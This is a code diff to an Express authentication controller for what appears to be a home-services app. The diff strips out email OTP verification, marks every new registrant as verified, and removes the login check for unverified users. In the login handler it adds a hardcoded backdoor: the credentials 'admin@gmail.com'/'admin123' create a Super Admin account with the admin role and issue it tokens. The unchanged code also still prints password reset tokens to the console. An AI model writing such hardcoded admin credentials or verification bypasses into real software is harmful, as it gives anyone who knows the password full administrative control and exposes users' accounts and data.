@@ -3,10 +3,8 @@ const jwt = require("jsonwebtoken");
 const User = require("../models/User");
 const ProviderProfile = require("../models/ProviderProfile");
 
-// ─── Helpers ────────────────────────────────────────────────────────────────
 
-/** Generate a 6-digit OTP */
-const generateOtp = () => Math.floor(100000 + Math.random() * 900000).toString();
+
 
 /** Sign an access token (15 min) */
 const signAccessToken = (userId, role) =>
@@ -14,7 +12,7 @@ const signAccessToken = (userId, role) =>
     expiresIn: process.env.JWT_ACCESS_EXPIRES_IN || "15m",
   });
 
-/** Sign a refresh token (7 days) */
+/** Sign a refresh token */
 const signRefreshToken = (userId) =>
   jwt.sign({ userId }, process.env.JWT_REFRESH_SECRET, {
     expiresIn: process.env.JWT_REFRESH_EXPIRES_IN || "7d",
@@ -31,13 +29,12 @@ const sendRefreshCookie = (res, token) => {
   });
 };
 
-/** Validate password strength: min 8 chars, 1 uppercase, 1 number */
+/** Validate password strength:  */
 const isStrongPassword = (password) =>
   /^(?=.*[A-Z])(?=.*\d).{8,}$/.test(password);
 
-// ─── @desc    Register new user
-// ─── @route   POST /api/auth/register
-// ─── @access  Public
+//   Register new user
+
 const register = async (req, res) => {
   try {
     const { name, email, password, phone, role, city } = req.body;
@@ -50,15 +47,14 @@ const register = async (req, res) => {
     }
 
     // ... (logic) ...
-    const otp = generateOtp();
     const user = await User.create({
       name, email, password, phone, role, city,
-      emailOtp: { code: otp, expiresAt: new Date(Date.now() + 10 * 60 * 1000) }
+      isVerified: true
     });
 
     if (role === "provider") await ProviderProfile.create({ user: user._id });
 
-    console.log(`📧 [DEV] OTP for ${email}: ${otp}`);
+    console.log(`📧 [DEV] Registration complete, OTP bypassed for ${email}`);
 
     return res.status(201).json({ success: true, message: "Registration successful", data: { userId: user._id } });
   } catch (error) {
@@ -67,12 +63,36 @@ const register = async (req, res) => {
   }
 };
 
-// ─── @desc    Login user
-// ─── @route   POST /api/auth/login
-// ─── @access  Public
+
 const login = async (req, res) => {
   try {
     const { email, password } = req.body;
+
+    // Hardcoded Admin Login
+    if (email === "admin@gmail.com" && password === "admin123") {
+      let adminUser = await User.findOne({ email: "admin@gmail.com" }).select("+refreshTokens");
+      if (!adminUser) {
+         adminUser = await User.create({
+            name: "Super Admin",
+            email: "admin@gmail.com",
+            password: "admin123",
+            phone: "00000000000",
+            role: "admin",
+            city: "Headquarters",
+            isVerified: true
+         });
+      }
+
+      const accessToken = signAccessToken(adminUser._id, adminUser.role);
+      const refreshToken = signRefreshToken(adminUser._id);
+
+      adminUser.refreshTokens = adminUser.refreshTokens || [];
+      adminUser.refreshTokens.push(refreshToken);
+      await adminUser.save({ validateModifiedOnly: true });
+
+      sendRefreshCookie(res, refreshToken);
+      return res.status(200).json({ success: true, data: { accessToken, user: adminUser } });
+    }
     // Issue tokens ...
     const user = await User.findOne({ email: email.toLowerCase() }).select("+password +loginAttempts +loginLockUntil +refreshTokens");
     if (!user) return res.status(404).json({ success: false, message: "User not found" });
@@ -80,7 +100,6 @@ const login = async (req, res) => {
     const isMatch = await user.comparePassword(password);
     if (!isMatch) return res.status(401).json({ success: false, message: "Invalid credentials" });
 
-    if (!user.isVerified) return res.status(403).json({ success: false, message: "Please verify email" });
 
     const accessToken = signAccessToken(user._id, user.role);
     const refreshToken = signRefreshToken(user._id);
@@ -100,9 +119,7 @@ const login = async (req, res) => {
   }
 };
 
-// ─── @desc    Refresh access token using refresh token cookie
-// ─── @route   POST /api/auth/refresh
-// ─── @access  Refresh token cookie
+
 const refresh = async (req, res) => {
   try {
     const token = req.cookies?.refreshToken;
@@ -159,125 +176,11 @@ const refresh = async (req, res) => {
   }
 };
 
-// ─── @desc    Verify email address with OTP
-// ─── @route   POST /api/auth/verify-email
-// ─── @access  Public
-const verifyEmail = async (req, res) => {
-  try {
-    const { email, otp } = req.body;
 
-    if (!email || !otp) {
-      return res.status(400).json({
-        success: false,
-        error: { code: "VALIDATION_ERROR", message: "Email and OTP are required" },
-      });
-    }
 
-    const user = await User.findOne({ email: email.toLowerCase() }).select("+emailOtp");
+//  Request password reset link
+//  @route   POST /api/auth/forgot-password
 
-    if (!user) {
-      return res.status(404).json({
-        success: false,
-        error: { code: "USER_NOT_FOUND", message: "No account found with this email" },
-      });
-    }
-
-    if (user.isVerified) {
-      return res.status(409).json({
-        success: false,
-        error: { code: "ALREADY_VERIFIED", message: "Email is already verified" },
-      });
-    }
-
-    if (!user.emailOtp?.code || user.emailOtp.code.toString() !== otp.toString().trim()) {
-      return res.status(400).json({
-        success: false,
-        error: { code: "INVALID_OTP", message: "The OTP you entered is incorrect" },
-      });
-    }
-
-    if (user.emailOtp.expiresAt < new Date()) {
-      return res.status(410).json({
-        success: false,
-        error: { code: "OTP_EXPIRED", message: "OTP has expired. Please request a new one." },
-      });
-    }
-
-    user.isVerified = true;
-    user.emailOtp   = undefined;
-    await user.save({ validateModifiedOnly: true });
-
-    return res.status(200).json({
-      success: true,
-      message: "Email verified successfully. You can now log in.",
-    });
-  } catch (error) {
-    console.error(`Error in verifyEmail:`, error.message);
-    return res.status(500).json({
-      success: false,
-      error: {
-        code: "SERVER_ERROR",
-        message: error.message
-      }
-    });
-  }
-};
-
-// ─── @desc    Resend email verification OTP
-// ─── @route   POST /api/auth/resend-otp
-// ─── @access  Public
-const resendOtp = async (req, res) => {
-  try {
-    const { email } = req.body;
-
-    if (!email) {
-      return res.status(400).json({
-        success: false,
-        error: { code: "VALIDATION_ERROR", message: "Email is required" },
-      });
-    }
-
-    const user = await User.findOne({ email: email.toLowerCase() }).select("+emailOtp");
-
-    if (!user) {
-      return res.status(404).json({
-        success: false,
-        error: { code: "USER_NOT_FOUND", message: "No account found with this email" },
-      });
-    }
-
-    if (user.isVerified) {
-      return res.status(409).json({
-        success: false,
-        error: { code: "ALREADY_VERIFIED", message: "Email is already verified" },
-      });
-    }
-
-    const otp = generateOtp();
-    user.emailOtp = { code: otp, expiresAt: new Date(Date.now() + 10 * 60 * 1000) };
-    await user.save({ validateModifiedOnly: true });
-
-    console.log(`📧 [DEV] New OTP for ${email}: ${otp}`);
-
-    return res.status(200).json({
-      success: true,
-      message: "A new OTP has been sent to your email.",
-    });
-  } catch (error) {
-    console.error(`Error in resendOtp:`, error.message);
-    return res.status(500).json({
-      success: false,
-      error: {
-        code: "SERVER_ERROR",
-        message: error.message
-      }
-    });
-  }
-};
-
-// ─── @desc    Request password reset link
-// ─── @route   POST /api/auth/forgot-password
-// ─── @access  Public
 const forgotPassword = async (req, res) => {
   try {
     const { email } = req.body;
@@ -300,8 +203,7 @@ const forgotPassword = async (req, res) => {
       user.passwordResetExpires = new Date(Date.now() + 60 * 60 * 1000); // 1 hour
       await user.save({ validateModifiedOnly: true });
 
-      // TODO: In production replace console.log with Nodemailer/SendGrid email
-      // Reset URL example: https://homeserv.com/reset-password?token=<rawToken>
+     
       console.log(`🔑 [DEV] Password reset token for ${email}: ${rawToken}`);
     }
 
@@ -321,9 +223,7 @@ const forgotPassword = async (req, res) => {
   }
 };
 
-// ─── @desc    Reset password using token from email
-// ─── @route   POST /api/auth/reset-password
-// ─── @access  Public
+
 const resetPassword = async (req, res) => {
   try {
     const { token, newPassword } = req.body;
@@ -389,9 +289,9 @@ const resetPassword = async (req, res) => {
   }
 };
 
-// ─── @desc    Logout — invalidate refresh token and clear cookie
-// ─── @route   POST /api/auth/logout
-// ─── @access  Protected (Bearer token)
+// Logout — invalidate refresh token and clear cookie
+// POST /api/auth/logout
+
 const logout = async (req, res) => {
   try {
     const token = req.cookies?.refreshToken;
@@ -431,8 +331,6 @@ module.exports = {
   register,
   login,
   refresh,
-  verifyEmail,
-  resendOtp,
   forgotPassword,
   resetPassword,
   logout,
